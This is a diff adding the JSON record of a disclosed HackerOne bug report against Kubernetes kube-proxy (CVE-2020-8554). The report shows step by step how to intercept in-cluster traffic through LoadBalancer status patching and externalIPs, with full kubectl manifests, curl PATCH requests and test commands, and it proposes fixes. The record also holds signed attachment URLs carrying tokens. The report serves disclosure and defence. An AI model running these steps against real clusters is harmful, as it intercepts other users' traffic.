@@ -1,0 +1,173 @@
+{
+  "id": 764986,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjQ5ODY=",
+  "url": "https://hackerone.com/reports/764986",
+  "title": "Man in the middle using LoadBalancer or ExternalIPs services",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-12-27T06:05:35.114Z",
+  "submitted_at": "2019-12-27T06:05:35.114Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "champtar",
+    "url": "/champtar",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8554"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-11-04T18:09:23.199Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-10-08T03:49:20.983Z",
+  "team_member_agreed_on_going_public_at": "2021-11-04T18:09:23.041Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I rated this vulnerability as high because trying to rate it with CVSS v3.0 Calculator gives me 9.9 which seems way too high  as you do require to be able to create services in the K8S cluster.\n\n## Summary:\nThis report details 2 ways to man in the middle traffic by:\na) creating a LoadBalancer service and patching the status with the attacked IP\nb) creating a ClusterIP service with ExternalIPs set to the attacked IP\n\nFor these 2 options, we explore:\n1) MITM of IPs external to the cluster (ex: 1.1.1.1)\n2) MITM of ClusterIP IP\n3) MITM of pod IP\n4) MITM of 127.0.0.1\n\nThis gives us 8 test cases, that I tested with kube-proxy mode IPVS, iptables, and a GKE cluster (if you need an easier repro than kubespray deployments)\n\nResults are: {F669473}\n\n## Kubernetes Version:\n```\nv1.16.3 deployed using kubespray\n1.15.4-gke.22 for the GKE cluster\n```\n\n## Component Version:\nTest cluster deployed on top of CentOS7 using kubespray v2.12.0\n```\ncontainer_manager: containerd\netcd_deployment_type: host\nkube_proxy_mode: ipvs OR kube_proxy_mode: iptables\n\n# kubectl get nodes -o wide\nNAME            STATUS   ROLES    AGE   VERSION   INTERNAL-IP    EXTERNAL-IP   OS-IMAGE                KERNEL-VERSION               CONTAINER-RUNTIME\netienne-ks141   Ready    master   48m   v1.16.3   10.10.52.141   <none>        CentOS Linux 7 (Core)   3.10.0-1062.9.1.el7.x86_64   containerd://1.2.10\netienne-ks142   Ready    master   47m   v1.16.3   10.10.52.142   <none>        CentOS Linux 7 (Core)   3.10.0-1062.9.1.el7.x86_64   containerd://1.2.10\netienne-ks143   Ready    <none>   45m   v1.16.3   10.10.52.143   <none>        CentOS Linux 7 (Core)   3.10.0-1062.9.1.el7.x86_64   containerd://1.2.10\netienne-ks144   Ready    <none>   45m   v1.16.3   10.10.52.144   <none>        CentOS Linux 7 (Core)   3.10.0-1062.9.1.el7.x86_64   containerd://1.2.10\n\nCalico 3.7.3\nCNI plugin 0.8.1\n```\n\n## Steps To Reproduce:\n\nWe assume that you already have a working k8s cluster\n\n### 0) prepare our tests\n\nDeploy \"victim-client\" pod to simulate an in-cluster HTTP client with curl\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Pod\nmetadata:\n  name: victim-client\nspec:\n  containers:\n    - name: curl\n      image: curlimages/curl:7.67.0\n      command: [ \"/bin/sleep\", \"3600\" ]\nEOF\n```\n\nCheck that we have access to our external victim (here 1.1.1.1)\n```\n# from a node\ncurl -sv http://1.1.1.1\ncurl -sv https://1.1.1.1 -k\n# from the pod\nkubectl exec victim-client -- curl -sv http://1.1.1.1\nkubectl exec victim-client -- curl -sv https://1.1.1.1 -k\n```\nDeploy our \"mitm pod\"\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: kubeproxy-mitm\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: echoserver\n  namespace: kubeproxy-mitm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: echoserver\n  template:\n    metadata:\n      labels:\n        app: echoserver\n    spec:\n      containers:\n      - image: gcr.io/google_containers/echoserver:1.10\n        name: echoserver\n        ports:\n        - name: http\n          containerPort: 8080\n        - name: https\n          containerPort: 8443\nEOF\n```\n\n### 1a) external traffic interception using service type LoadBalancer\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-external-lb\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: http\n    port: 80\n    targetPort: 8080\n  - name: https\n    port: 443\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: LoadBalancer\nEOF\nkubectl proxy --port=8080 &\nsleep 3\ncurl -k -v -XPATCH  -H \"Accept: application/json\" -H \"Content-Type: application/merge-patch+json\" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-external-lb/status' -d '{\"status\":{\"loadBalancer\":{\"ingress\":[{\"ip\":\"1.1.1.1\"}]}}}'\npkill kubectl\n```\nAfter the patch call, LoadBalancer IP is properly configured (ie not pending)\n```\nkubectl get -n kubeproxy-mitm svc/mitm-external-lb\n# NAME               TYPE           CLUSTER-IP     EXTERNAL-IP   PORT(S)                      AGE\n# mitm-external-lb   LoadBalancer   10.233.53.58   1.1.1.1       80:31475/TCP,443:31258/TCP   47s\n```\nTest if the MITM works\n```\n# node -> ip\ncurl -sv http://1.1.1.1\ncurl -sv https://1.1.1.1 -k\n# pod -> ip\nkubectl exec victim-client -- curl -sv http://1.1.1.1\nkubectl exec victim-client -- curl -sv https://1.1.1.1 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-external-lb\n```\n\n### 1b) external traffic interception using service type ClusterIP + externalIPs\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-external-eip\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: http\n    port: 80\n    targetPort: 8080\n  - name: https\n    port: 443\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: ClusterIP\n  externalIPs:\n    - 1.1.1.1\nEOF\n```\nTest if the MITM works\n```\n# node -> ip\ncurl -sv http://1.1.1.1\ncurl -sv https://1.1.1.1 -k\n# pod -> ip\nkubectl exec victim-client -- curl -sv http://1.1.1.1\nkubectl exec victim-client -- curl -sv https://1.1.1.1 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-external-eip\n```\n\n### 2a) k8s service traffic interception using service type LoadBalancer\n\nFind a service to attack, in my testing I chose kubernetes-dashboard\n```\nkubectl get -n kube-system svc/kubernetes-dashboard\n# NAME                   TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)   AGE\n# kubernetes-dashboard   ClusterIP   10.233.36.240   <none>        443/TCP   87m\n```\nTest if the service is working\n```\n# node -> clusterIP\ncurl -sv https://10.233.36.240 -k\n# pod -> clusterIP\nkubectl exec victim-client -- curl -sv https://10.233.36.240 -k\n```\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-service-lb\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: LoadBalancer\nEOF\nkubectl proxy --port=8080 &\nsleep 3\ncurl -k -v -XPATCH  -H \"Accept: application/json\" -H \"Content-Type: application/merge-patch+json\" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-service-lb/status' -d '{\"status\":{\"loadBalancer\":{\"ingress\":[{\"ip\":\"10.233.36.240\"}]}}}'\npkill kubectl\n```\nTest if the MITM works\n```\n# node -> clusterIP\ncurl -sv https://10.233.36.240 -k\n# pod -> clusterIP\nkubectl exec victim-client -- curl -sv https://10.233.36.240 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-service-lb\n```\n\n### 2b) k8s service traffic interception using service type ClusterIP + externalIPs\n\nFind a service to attack, in my testing I chose kubernetes-dashboard\n```\nkubectl get -n kube-system svc/kubernetes-dashboard\n# NAME                   TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)   AGE\n# kubernetes-dashboard   ClusterIP   10.233.36.240   <none>        443/TCP   87m\n```\nTest if the service is working before the MITM\n```\n# node -> clusterIP\ncurl -sv https://10.233.36.240 -k\n# pod -> clusterIP\nkubectl exec victim-client -- curl -sv https://10.233.36.240 -k\n```\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-service-eip\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: ClusterIP\n  externalIPs:\n    - 10.233.36.240\nEOF\n```\nTest if MITM works\n```\n# node -> clusterIP\ncurl -sv https://10.233.36.240 -k\n# pod -> clusterIP\nkubectl exec victim-client -- curl -sv https://10.233.36.240 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-service-eip\n```\n\n### 3a) k8s pod traffic interception using service type LoadBalancer\n\nFind a service to attack + its endpoints, in my testing I chose kubernetes-dashboard\n```\nkubectl get -n kube-system svc/kubernetes-dashboard\n# NAME                   TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE\n# kubernetes-dashboard   ClusterIP   10.233.36.240   <none>        443/TCP   42m\n\nkubectl get -n kube-system endpoints kubernetes-dashboard\n# NAME                   ENDPOINTS           AGE\n# kubernetes-dashboard   10.233.115.2:8443   9h\n```\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-pod-lb\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  - name: https2\n    port: 8443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: LoadBalancer\nEOF\nkubectl proxy --port=8080 &\nsleep 3\ncurl -k -v -XPATCH  -H \"Accept: application/json\" -H \"Content-Type: application/merge-patch+json\" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-pod-lb/status' -d '{\"status\":{\"loadBalancer\":{\"ingress\":[{\"ip\":\"10.233.115.2\"}]}}}'\npkill kubectl\n```\nTest if MITM works\n```\n# node -> clusterIP\ncurl -sv https://10.233.36.240 -k\n# pod -> clusterIP\nkubectl exec victim-client -- curl -sv https://10.233.36.240 -k\n# node -> endpoint\ncurl -sv https://10.233.115.2:8443 -k\n# pod -> endpoint\nkubectl exec victim-client -- curl -sv https://10.233.115.2:8443 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-pod-lb\n```\n\n### 3b) k8s pod traffic interception using service type ClusterIP + externalIPs\n\nFind a service to attack + its endpoints, in my testing I chose kubernetes-dashboard\n```\nkubectl get -n kube-system svc/kubernetes-dashboard\n# NAME                   TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE\n# kubernetes-dashboard   ClusterIP   10.233.36.240   <none>        443/TCP   42m\n\nkubectl get -n kube-system endpoints kubernetes-dashboard\n# NAME                   ENDPOINTS           AGE\n# kubernetes-dashboard   10.233.115.2:8443   9h\n```\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-pod-eip\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  - name: https2\n    port: 8443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: ClusterIP\n  externalIPs:\n    - 10.233.115.2\nEOF\n```\nTest if MITM works\n```\n# node -> clusterIP\ncurl -sv https://10.233.36.240 -k\n# pod -> clusterIP\nkubectl exec victim-client -- curl -sv https://10.233.36.240 -k\n# node -> endpoint\ncurl -sv https://10.233.115.2:8443 -k\n# pod -> endpoint\nkubectl exec victim-client -- curl -sv https://10.233.115.2:8443 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-pod-eip\n```\n\n### 4a) node localhost traffic interception using service type LoadBalancer\n\n(This might also work against a container with hostNetwork=true)\n\nDeploy the MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-local-lb\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: smtp\n    port: 25\n    protocol: TCP\n    targetPort: 8080\n  - name: http\n    port: 80\n    protocol: TCP\n    targetPort: 8080\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: LoadBalancer\nEOF\nkubectl proxy --port=8080 &\nsleep 3\ncurl -k -v -XPATCH  -H \"Accept: application/json\" -H \"Content-Type: application/merge-patch+json\" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-local-lb/status' -d '{\"status\":{\"loadBalancer\":{\"ingress\":[{\"ip\":\"127.0.0.1\"}]}}}'\npkill kubectl\n```\n\nOn my CentOS7 there is postfix listening on 127.0.0.1:25 (thus the test with port 25)\nTest if the MITM works\n```\ncurl http://127.0.0.1:25\ncurl http://127.0.0.1\ncurl https://127.0.0.1 -k\n```\nCleanup\n```\nkubectl delete -n kubeproxy-mitm svc/mitm-local-lb\n```\n\n### 4b) node localhost traffic interception using service type ClusterIP + externalIPs\n\nTry to deploy our MITM\n```\nkubectl apply -f - <<'EOF'\napiVersion: v1\nkind: Service\nmetadata:\n  name: mitm-local-eip\n  namespace: kubeproxy-mitm\nspec:\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: echoserver\n  type: ClusterIP\n  externalIPs:\n    - 127.0.0.1\nEOF\n```\nThis one fails with\n```\nThe Service \"mitm-local-eip\" is invalid: spec.externalIPs[0]: Invalid value: \"127.0.0.1\": may not be in the loopback range (127.0.0.0/8)\n```\n\n## Additional informations:\n\nThis work doesn't claim to be exhaustive, here are some limitations:\n- I didn't attempt to MITM DNS traffic, as it's UDP, it might behave differently than TCP, but pretty sure it works in some cases\n- I didn't try to reproduce my findings with other kube-proxy replacements (Cilium, ...)\n- I didn't try to reproduce my findings with Network policies configured\n- I didn't try to reproduce my findings with services mesh encryption like Istio\n- I didn't try multiple CNI\n- I didn't look at IPv6\n- I didn't try to MITM Loadbalancer IPs with external IPs and vice versa\n- I didn't fully investigate if having a service that changes ports (443->8443) makes a difference versus a service that doesn't (443->443)\n\nIssues 2/3/4 could be fixed via a blacklist approach, at the API level, loadBalancerIP and externalIPs must not be allowed in the same range as clusterIPs, pods IPs, localhost, nodeIPs, and maybe some other reserved ranged.\n\nIssues 1a/1b are expected behaviours in my opinion. I want to be able to access my LoadBalancer IP from my pods and nodes, so a possible fix here would be a whitelist, and give the rights to real LB controllers to update this whitelist.\n\nWe also need to make sure we can't use the same IP as both Loadbalancer IP and external IP.\n\n## Supporting Material/References:\n\nBoth kube-proxy config attached\n\nCommand line to create the test GKE cluster:\n```\ngcloud beta container --project \"my-project\" clusters create \"kubeproxy-tests\" --zone \"us-central1-a\" --no-enable-basic-auth --cluster-version \"1.15.4-gke.22\" --machine-type \"n1-standard-2\" --image-type \"COS\" --disk-type \"pd-standard\" --disk-size \"100\" --metadata disable-legacy-endpoints=true --scopes \"https://www.googleapis.com/auth/devstorage.read_only\",\"https://www.googleapis.com/auth/logging.write\",\"https://www.googleapis.com/auth/monitoring\",\"https://www.googleapis.com/auth/servicecontrol\",\"https://www.googleapis.com/auth/service.management.readonly\",\"https://www.googleapis.com/auth/trace.append\" --num-nodes \"3\" --enable-stackdriver-kubernetes --no-enable-ip-alias --network \"projects/copper-frame-263204/global/networks/default\" --subnetwork \"projects/copper-frame-263204/regions/us-central1/subnetworks/default\" --addons HorizontalPodAutoscaling,HttpLoadBalancing --enable-autoupgrade --enable-autorepair\n```\nFor GKE I used \"metrics-server\" instead of \"kubernetes-dashboard\" as victim service\n\n## Impact\n\nAn attacker able to create and/or patch services can, depending on the mode of kube-proxy:\n- MITM traffic destined for IPs external to the cluster (ex: 1.1.1.1)\n- MITM traffic destined for ClusterIP IP\n- MITM traffic destined for pod IP\n- MITM traffic destined for 127.0.0.1",
+  "weakness": {
+    "id": 30,
+    "name": "Man-in-the-Middle"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 669473,
+      "file_name": "Capture_d__cran_du_2019-12-26_20-20-23.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4sQpNaC7Dx7LHA3P9JyrtAZz?response-content-disposition=attachment%3B%20filename%3D%22Capture_d__cran_du_2019-12-26_20-20-23.png%22%3B%20filename%2A%3DUTF-8%27%27Capture_d__cran_du_2019-12-26_20-20-23.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5A3QBGAF%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133409Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDOmRjyw5I%2FTlNnXkSaQt0HWBvcx4KUqlbsBDywYvgMjAIgc1T3omLkZfSHGnxG7u3M%2BDm3ZU5hXXACm6d42GSb7EAqsQUIdhADGgwwMTM2MTkyNzQ4NDkiDI1cp4QslnXVHIUCaCqOBecH%2BJNC0KwQ%2BfCYMGM86f%2FOS1Dm%2BIA%2BHjSlOORnFjZmELOvSSorEYFhUaPaxwQcFsTE7OMurOw%2BQnTNbwJzmGH%2FjDpGT%2FxwOi1Yf0v9t5xHdyje9QeqWvWnPlxRuLTKdeHLfuYjPaGYHjDPk%2ByYZLTVi%2F6fLFk1LMc7Dx726KzEvXPKCa4bME8qI31URj4F9nDQiBGwytvr7Hm1EMgKGmVAK6%2Fbzd%2BJiZVqxHd3sYJSTbmtS%2BAl2zqAc8BSfBosM0X88oi3lBTlSqMNhfG3CaAXBePpXwzrVOqz74NfDYXdsP4VQdYegntsv6fFEZFiKkjhlglh0X4pAXPbvFNkY8C7BzpUD2tNRzacCXSlRaco9RM5vUg086o63M3dgo9tb8DkSAwOHamrNu%2F2KO2aggnlYsi1aZ7EJQTnQ4h%2BcjkM2D28%2Bxcxlpa3Ec2gB5yd%2BQcUjU%2BzbbmFbStd4UJXYiE38Skp99somT%2BpCEikiE7WFVYA5Pgb9J6BqOzjaorE7DzLysbe4e0jMnv06eVq4H%2Bz42eH%2FkluYPtzip94lWrairjO%2BPy%2BVDKDVJai6d1iVpfcEFmbncPaNpU53sKrhSNhpvIUbUDu5YaFK6X%2FbL%2BeFksXVgGaf0JwUeSzAh%2FGbxLEuo6xDzuhAOmMHndLW%2FF8uphSoqM7NkjvQNWF4znkPMyfsDxu0sKfOHhED1nQ5geErhYuMeCPDWNlWvJKC2X93i%2B8i8WntV0NtA21WXhLXSnrHVz2HCPlDghBMIvH7mgPpfyFhSMGQDeGjpSbj3uInocAFuDTAgJeZIwRGGMYeOXoRMIVrM6FWdeiP%2FaI3a0LUECdOBOPVvRMLQuf7VJvF0078t1crT4PlcQMPTC%2Fwq2uBjqxAVnkBdxFUTWQ4ZupRlHVu9PZr1k7xqw4QHDS7pllKyJWE05aIrKtcQLI8f74A6IlC2qLL0KpjvsW622557lHAqxIiBIxR28dhgaLkoywMH6F6KWd%2BowMbbVNahcgFgF8sWKuHHJPaj4kiHcEz7czNhJgm88FkmgTRhhw7HW2Z01FS2x%2BrnGRx5%2BvOZPEvDu%2BIRvDNGu%2FVrwK5wtu%2BRwxD8V7oEVMXOuAFSFlduj5GO6kbQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8072dac2719e65053c9cd4d16e4d0a1b67aa4f74cb3dc088ac2fa6aeb85fced4",
+      "file_size": 49354,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 669483,
+      "file_name": "kubeproxy.ipvs.conf",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Etepgw8foKZNeJhj84jFbGbm?response-content-disposition=attachment%3B%20filename%3D%22kubeproxy.ipvs.conf%22%3B%20filename%2A%3DUTF-8%27%27kubeproxy.ipvs.conf&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5A3QBGAF%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133409Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDOmRjyw5I%2FTlNnXkSaQt0HWBvcx4KUqlbsBDywYvgMjAIgc1T3omLkZfSHGnxG7u3M%2BDm3ZU5hXXACm6d42GSb7EAqsQUIdhADGgwwMTM2MTkyNzQ4NDkiDI1cp4QslnXVHIUCaCqOBecH%2BJNC0KwQ%2BfCYMGM86f%2FOS1Dm%2BIA%2BHjSlOORnFjZmELOvSSorEYFhUaPaxwQcFsTE7OMurOw%2BQnTNbwJzmGH%2FjDpGT%2FxwOi1Yf0v9t5xHdyje9QeqWvWnPlxRuLTKdeHLfuYjPaGYHjDPk%2ByYZLTVi%2F6fLFk1LMc7Dx726KzEvXPKCa4bME8qI31URj4F9nDQiBGwytvr7Hm1EMgKGmVAK6%2Fbzd%2BJiZVqxHd3sYJSTbmtS%2BAl2zqAc8BSfBosM0X88oi3lBTlSqMNhfG3CaAXBePpXwzrVOqz74NfDYXdsP4VQdYegntsv6fFEZFiKkjhlglh0X4pAXPbvFNkY8C7BzpUD2tNRzacCXSlRaco9RM5vUg086o63M3dgo9tb8DkSAwOHamrNu%2F2KO2aggnlYsi1aZ7EJQTnQ4h%2BcjkM2D28%2Bxcxlpa3Ec2gB5yd%2BQcUjU%2BzbbmFbStd4UJXYiE38Skp99somT%2BpCEikiE7WFVYA5Pgb9J6BqOzjaorE7DzLysbe4e0jMnv06eVq4H%2Bz42eH%2FkluYPtzip94lWrairjO%2BPy%2BVDKDVJai6d1iVpfcEFmbncPaNpU53sKrhSNhpvIUbUDu5YaFK6X%2FbL%2BeFksXVgGaf0JwUeSzAh%2FGbxLEuo6xDzuhAOmMHndLW%2FF8uphSoqM7NkjvQNWF4znkPMyfsDxu0sKfOHhED1nQ5geErhYuMeCPDWNlWvJKC2X93i%2B8i8WntV0NtA21WXhLXSnrHVz2HCPlDghBMIvH7mgPpfyFhSMGQDeGjpSbj3uInocAFuDTAgJeZIwRGGMYeOXoRMIVrM6FWdeiP%2FaI3a0LUECdOBOPVvRMLQuf7VJvF0078t1crT4PlcQMPTC%2Fwq2uBjqxAVnkBdxFUTWQ4ZupRlHVu9PZr1k7xqw4QHDS7pllKyJWE05aIrKtcQLI8f74A6IlC2qLL0KpjvsW622557lHAqxIiBIxR28dhgaLkoywMH6F6KWd%2BowMbbVNahcgFgF8sWKuHHJPaj4kiHcEz7czNhJgm88FkmgTRhhw7HW2Z01FS2x%2BrnGRx5%2BvOZPEvDu%2BIRvDNGu%2FVrwK5wtu%2BRwxD8V7oEVMXOuAFSFlduj5GO6kbQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8ed68d6f102c99b921552e77d27c65bc5da9486aecca596f6dd4a81d355d83a8",
+      "file_size": 971,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 669493,
+      "file_name": "kubeproxy.iptables.conf",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RcCFRo2RiogRkKTpc526MiJ6?response-content-disposition=attachment%3B%20filename%3D%22kubeproxy.iptables.conf%22%3B%20filename%2A%3DUTF-8%27%27kubeproxy.iptables.conf&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5A3QBGAF%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133409Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDOmRjyw5I%2FTlNnXkSaQt0HWBvcx4KUqlbsBDywYvgMjAIgc1T3omLkZfSHGnxG7u3M%2BDm3ZU5hXXACm6d42GSb7EAqsQUIdhADGgwwMTM2MTkyNzQ4NDkiDI1cp4QslnXVHIUCaCqOBecH%2BJNC0KwQ%2BfCYMGM86f%2FOS1Dm%2BIA%2BHjSlOORnFjZmELOvSSorEYFhUaPaxwQcFsTE7OMurOw%2BQnTNbwJzmGH%2FjDpGT%2FxwOi1Yf0v9t5xHdyje9QeqWvWnPlxRuLTKdeHLfuYjPaGYHjDPk%2ByYZLTVi%2F6fLFk1LMc7Dx726KzEvXPKCa4bME8qI31URj4F9nDQiBGwytvr7Hm1EMgKGmVAK6%2Fbzd%2BJiZVqxHd3sYJSTbmtS%2BAl2zqAc8BSfBosM0X88oi3lBTlSqMNhfG3CaAXBePpXwzrVOqz74NfDYXdsP4VQdYegntsv6fFEZFiKkjhlglh0X4pAXPbvFNkY8C7BzpUD2tNRzacCXSlRaco9RM5vUg086o63M3dgo9tb8DkSAwOHamrNu%2F2KO2aggnlYsi1aZ7EJQTnQ4h%2BcjkM2D28%2Bxcxlpa3Ec2gB5yd%2BQcUjU%2BzbbmFbStd4UJXYiE38Skp99somT%2BpCEikiE7WFVYA5Pgb9J6BqOzjaorE7DzLysbe4e0jMnv06eVq4H%2Bz42eH%2FkluYPtzip94lWrairjO%2BPy%2BVDKDVJai6d1iVpfcEFmbncPaNpU53sKrhSNhpvIUbUDu5YaFK6X%2FbL%2BeFksXVgGaf0JwUeSzAh%2FGbxLEuo6xDzuhAOmMHndLW%2FF8uphSoqM7NkjvQNWF4znkPMyfsDxu0sKfOHhED1nQ5geErhYuMeCPDWNlWvJKC2X93i%2B8i8WntV0NtA21WXhLXSnrHVz2HCPlDghBMIvH7mgPpfyFhSMGQDeGjpSbj3uInocAFuDTAgJeZIwRGGMYeOXoRMIVrM6FWdeiP%2FaI3a0LUECdOBOPVvRMLQuf7VJvF0078t1crT4PlcQMPTC%2Fwq2uBjqxAVnkBdxFUTWQ4ZupRlHVu9PZr1k7xqw4QHDS7pllKyJWE05aIrKtcQLI8f74A6IlC2qLL0KpjvsW622557lHAqxIiBIxR28dhgaLkoywMH6F6KWd%2BowMbbVNahcgFgF8sWKuHHJPaj4kiHcEz7czNhJgm88FkmgTRhhw7HW2Z01FS2x%2BrnGRx5%2BvOZPEvDu%2BIRvDNGu%2FVrwK5wtu%2BRwxD8V7oEVMXOuAFSFlduj5GO6kbQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a78795a9cb25525636b28997ea6896a0c39c3358965b4a7f9c4aa1b4e2eb1fe1",
+      "file_size": 975,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-11-07T03:49:21.062Z",
+  "allow_singular_disclosure_after": -71574288.92246775,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "ali",
+    "meispi"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 32490,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes/kube-proxy",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 96744,
+      "category": "researcher",
